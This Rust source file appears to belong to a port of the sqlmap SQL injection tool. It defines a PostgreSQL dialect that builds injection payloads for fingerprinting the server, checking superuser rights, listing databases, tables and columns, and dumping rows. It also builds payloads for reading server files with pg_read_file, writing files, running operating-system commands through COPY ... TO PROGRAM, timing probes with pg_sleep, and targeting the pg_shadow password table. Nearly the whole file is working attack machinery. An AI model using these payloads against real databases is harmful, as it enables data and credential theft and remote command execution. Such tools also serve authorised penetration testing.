//! PostgreSQL / Greenplum / Redshift / CockroachDB / Yugabyte / AlloyDB / OpenGauss / Aurora Postgres.

use crate::Dialect;
use sqlmap_core::dbms_kind::Dbms;

pub struct PostgresDialect;

impl Dialect for PostgresDialect {
    fn dbms(&self) -> Dbms { Dbms::PostgreSQL }
    fn banner_query(&self) -> &'static str { "version()" }
    fn current_user_query(&self) -> &'static str { "current_user" }
    fn current_db_query(&self) -> &'static str { "current_database()" }
    fn hostname_query(&self) -> &'static str { "inet_server_addr()" }
    fn is_dba_query(&self) -> &'static str { "(SELECT rolsuper FROM pg_roles WHERE rolname=current_user)" }
    fn list_dbs(&self) -> &'static str { "SELECT string_agg(datname, ',') FROM pg_database" }
    fn list_tables(&self, db: &str) -> String {
        let _ = db;
        "SELECT string_agg(table_schema||'.'||table_name, ',') FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')".into()
    }
    fn list_columns(&self, db: &str, table: &str) -> String {
        let _ = db;
        format!("SELECT string_agg(column_name||':'||data_type, ',') FROM information_schema.columns WHERE table_name='{table}'")
    }
    fn count_rows(&self, db: &str, table: &str) -> String {
        let _ = db;
        format!("SELECT count(*) FROM {table}")
    }
    fn dump_rows(&self, db: &str, table: &str, cols: &[&str], start: usize, count: usize) -> String {
        let _ = db;
        let cols = if cols.is_empty() { "*".to_string() } else { cols.join(",") };
        format!("SELECT string_agg({cols}::text, U&'\\001f') FROM (SELECT {cols} FROM {table} LIMIT {count} OFFSET {start}) sub")
    }
    fn file_read(&self, path: &str) -> String {
        format!("(SELECT pg_read_file('{path}'))")
    }
    fn file_write(&self, bytes_hex: &str, dest: &str) -> String {
        // pg uses lo_import / lo_export normally; lacking that we fall back to
        // COPY ... TO PROGRAM. Caller must have superuser.
        format!("COPY (SELECT decode('{bytes_hex}','hex')) TO '{dest}'")
    }
    fn os_cmd(&self, cmd: &str) -> String {
        format!("COPY (SELECT '') TO PROGRAM '{}'", cmd.replace('\'', "''"))
    }
    fn substr(&self, expr: &str, pos: usize, len: usize) -> String {
        format!("substring(({expr}) FROM {pos} FOR {len})")
    }
    fn ord(&self, ch: &str) -> String { format!("ascii({ch})") }
    fn concat(&self, parts: &[&str]) -> String { parts.join("||") }
    fn sleep(&self, seconds: u32) -> String { format!("pg_sleep({seconds})") }
    fn password_table(&self) -> &'static str { "pg_shadow" }
    fn comment(&self) -> &'static str { "-- -" }
}
